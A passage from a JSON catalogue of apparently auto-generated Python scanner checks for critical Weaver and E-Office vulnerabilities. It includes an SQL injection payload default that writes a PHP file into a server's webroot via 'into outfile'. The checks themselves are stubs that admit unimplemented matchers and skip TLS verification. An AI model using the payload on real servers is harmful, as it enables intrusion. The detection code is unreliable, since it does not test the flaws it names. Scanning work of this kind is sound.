        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-e-mobile-rce\nName: Weaver E-mobile client.do - Remote Code Execution\nSeverity: critical\nDescription: E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the command execution function of the underlying operating system. An attacker can insert special characters or Command sequence to trick the application into executing it as a valid command, thus gaining command execution permissions from the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_e_mobile_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-e-mobile-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-mobile client.do - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code == 200; contains(body,'Windows IP Configuration') | mot(s) 'application/json, text/html'\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP Configuration', 'application/json, text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-mobile client.do - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_e_mobile_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "e-mobile",
          "rce",
          "weaver",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_ecology_bshservlet_rce",
        "name": "Weaver E-Cology BeanShell - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Weaver BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.",
        "severity": "critical",
        "detection": "[AND] regex ['BeanShell Test Servlet', '(?i)<pre>(\\n.*){{randstr}}'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-ecology-bshservlet-rce\nName: Weaver E-Cology BeanShell - Remote Command Execution\nSeverity: critical\nDescription: Weaver BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_ecology_bshservlet_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-ecology-bshservlet-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-Cology BeanShell - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['BeanShell Test Servlet', '(?i)<pre>(\\\\n.*){{randstr}}'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['BeanShell Test Servlet', '(?i)<pre>(\\\\n.*){{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-Cology BeanShell - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_ecology_bshservlet_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-ecology-bshservlet-rce\nName: Weaver E-Cology BeanShell - Remote Command Execution\nSeverity: critical\nDescription: Weaver BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_ecology_bshservlet_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-ecology-bshservlet-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-Cology BeanShell - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['BeanShell Test Servlet', '(?i)<pre>(\\\\n.*){{randstr}}'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['BeanShell Test Servlet', '(?i)<pre>(\\\\n.*){{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-Cology BeanShell - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_ecology_bshservlet_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "beanshell",
          "rce",
          "weaver",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_group_xml_sqli",
        "name": "OA E-Office group_xml.php - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{md5(string)}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "weaver-group-xml-sqli"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "[group]:[1]|[groupid]:[1 union select '<?php echo md5(\"{{string}}\");unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-group-xml-sqli\nName: OA E-Office group_xml.php - SQL Injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_group_xml_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-group-xml-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office group_xml.php - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office group_xml.php - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_group_xml_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-group-xml-sqli\nName: OA E-Office group_xml.php - SQL Injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_group_xml_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-group-xml-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office group_xml.php - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office group_xml.php - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_group_xml_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "e-office",
          "oa",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_jquery_file_upload",
        "name": "OA E-Office jQuery - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Arbitrary File Upload in OA E-Office jQuery.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code_1 == 200; status_code_3 == 200 && contains(body_3,'{{string}}')",
        "parameters": [
